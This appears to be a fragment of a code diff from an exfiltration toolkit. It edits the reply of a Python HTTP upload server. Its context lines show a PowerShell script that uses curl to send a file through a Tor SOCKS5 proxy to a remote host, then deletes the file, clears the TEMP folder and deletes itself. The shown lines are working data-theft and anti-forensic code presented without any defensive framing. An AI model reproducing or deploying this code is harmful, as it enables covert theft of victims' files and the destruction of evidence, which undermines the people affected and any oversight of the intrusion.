@@ -98,7 +98,7 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
-            self.wfile.write(f"File uploaded as {filename}".encode('utf-8'))
+            self.wfile.write(f"{filename}\n".encode('utf-8'))
 
         else:
             self.send_response(404)
@@ -134,4 +134,3 @@ cmd.exe /c "curl --socks5-hostname 127.0.0.1:9050 -F file=@`"$exfile`" http://$r
 Remove-Item -Path $exfile -Force
 Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
-
